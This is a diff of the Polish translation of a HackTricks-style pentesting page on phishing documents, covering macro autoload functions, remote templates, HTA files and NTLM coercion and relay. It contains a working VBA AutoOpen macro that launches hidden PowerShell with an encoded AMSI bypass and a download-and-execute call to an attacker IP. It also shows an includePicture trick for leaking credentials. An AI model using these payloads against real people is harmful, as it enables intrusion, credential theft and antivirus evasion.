@@ -1,8 +1,8 @@
-# Phishing Files & Documents
+# Pliki i dokumenty phishingowe
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Office Documents
+## Dokumenty Office
 
 Microsoft Word wykonuje walidację danych pliku przed jego otwarciem. Walidacja danych odbywa się w formie identyfikacji struktury danych, zgodnie ze standardem OfficeOpenXML. Jeśli wystąpi błąd podczas identyfikacji struktury danych, analizowany plik nie zostanie otwarty.
 
@@ -14,27 +14,27 @@ Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia b�
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
+DOCX pliki odwołujące się do zdalnego szablonu (Plik – Opcje – Dodatki – Zarządzaj: Szablony – Przejdź) które zawierają makra mogą również „wykonywać” makra.
 
-### External Image Load
+### Ładowanie zewnętrznych obrazów
 
-Go to: _Insert --> Quick Parts --> Field_\
-_**Kategorie**: Links and References, **Nazwa pola**: includePicture, and **Nazwa pliku lub URL**:_ http://\<ip>/whatever
+Przejdź do: _Wstaw --> Szybkie części --> Pole_\
+_**Kategorie**: Linki i odniesienia, **Nazwy pól**: includePicture, oraz **Nazwa pliku lub URL**:_ http://\<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
-### Macros Backdoor
+### Backdoor w makrach
 
-It's possible to use macros to run arbitrary code from the document.
+Możliwe jest użycie makr do uruchamiania dowolnego kodu z dokumentu.
 
-#### Autoload functions
+#### Funkcje autoload
 
-Im bardziej są powszechne, tym większe prawdopodobieństwo, że AV je wykryje.
+Im bardziej powszechne, tym bardziej prawdopodobne, że AV je wykryje.
 
 - AutoOpen()
 - Document_Open()
 
-#### Macros Code Examples
+#### Przykłady kodu makr
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -70,8 +70,8 @@ Przejdź do **Plik > Informacje > Sprawdź dokument > Sprawdź dokument**, co ot
 
 #### Rozszerzenie dokumentu
 
-Po zakończeniu wybierz rozwijane menu **Zapisz jako typ**, zmień format z **`.docx`** na **Word 97-2003 `.doc`**.\
-Zrób to, ponieważ **nie możesz zapisać makr w `.docx`** i istnieje **stygmat** **związany** z rozszerzeniem makro-włączonym **`.docm`** (np. ikona miniatury ma ogromne `!`, a niektóre bramy internetowe/e-mailowe całkowicie je blokują). Dlatego to **stare rozszerzenie `.doc` jest najlepszym kompromisem**.
+Po zakończeniu, wybierz rozwijane menu **Zapisz jako typ**, zmień format z **`.docx`** na **Word 97-2003 `.doc`**.\
+Zrób to, ponieważ **nie możesz zapisać makr w `.docx`** i istnieje **stygmat** **wokół** rozszerzenia z makrami **`.docm`** (np. ikona miniatury ma ogromne `!` i niektóre bramy internetowe/e-mailowe całkowicie je blokują). Dlatego to **stare rozszerzenie `.doc` jest najlepszym kompromisem**.
 
 #### Generatory złośliwych makr
 
@@ -81,7 +81,7 @@ Zrób to, ponieważ **nie możesz zapisać makr w `.docx`** i istnieje **stygmat
 
 ## Pliki HTA
 
-HTA to program Windows, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i działa jako "w pełni zaufana" aplikacja, bez ograniczeń modelu bezpieczeństwa przeglądarki.
+HTA to program Windows, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i działa jako aplikacja "w pełni zaufana", bez ograniczeń modelu bezpieczeństwa przeglądarki.
 
 HTA jest uruchamiane za pomocą **`mshta.exe`**, które jest zazwyczaj **instalowane** razem z **Internet Explorer**, co sprawia, że **`mshta` jest zależne od IE**. Jeśli zostało odinstalowane, HTA nie będą mogły się uruchomić.
 ```html
@@ -140,23 +140,25 @@ self.close
 ```
 ## Wymuszanie uwierzytelniania NTLM
 
-Istnieje kilka sposobów na **wymuszenie uwierzytelniania NTLM "zdalnie"**, na przykład możesz dodać **niewidoczne obrazy** do e-maili lub HTML, do których użytkownik uzyska dostęp (nawet HTTP MitM?). Lub wysłać ofierze **adres plików**, które **wywołają** **uwierzytelnienie** tylko przy **otwieraniu folderu.**
+Istnieje kilka sposobów na **wymuszenie uwierzytelniania NTLM "zdalnie"**, na przykład możesz dodać **niewidoczne obrazy** do e-maili lub HTML, które użytkownik otworzy (nawet HTTP MitM?). Lub wysłać ofierze **adres plików**, które **wywołają** **uwierzytelnienie** tylko przy **otwieraniu folderu.**
 
 **Sprawdź te pomysły i więcej na następujących stronach:**
+
 
 {{#ref}}
 ../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
 {{#endref}}
 
+
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
-### Przekazywanie NTLM
+### Przekaźnik NTLM
 
-Nie zapomnij, że nie tylko możesz ukraść hash lub uwierzytelnienie, ale także **przeprowadzać ataki przekazywania NTLM**:
+Nie zapomnij, że nie tylko możesz ukraść hash lub uwierzytelnienie, ale także **przeprowadzać ataki przekaźnikowe NTLM**:
 
-- [**Ataki przekazywania NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-- [**AD CS ESC8 (przekazywanie NTLM do certyfikatów)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+- [**Ataki przekaźnikowe NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+- [**AD CS ESC8 (przekaźnik NTLM do certyfikatów)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 {{#include ../../banners/hacktricks-training.md}}
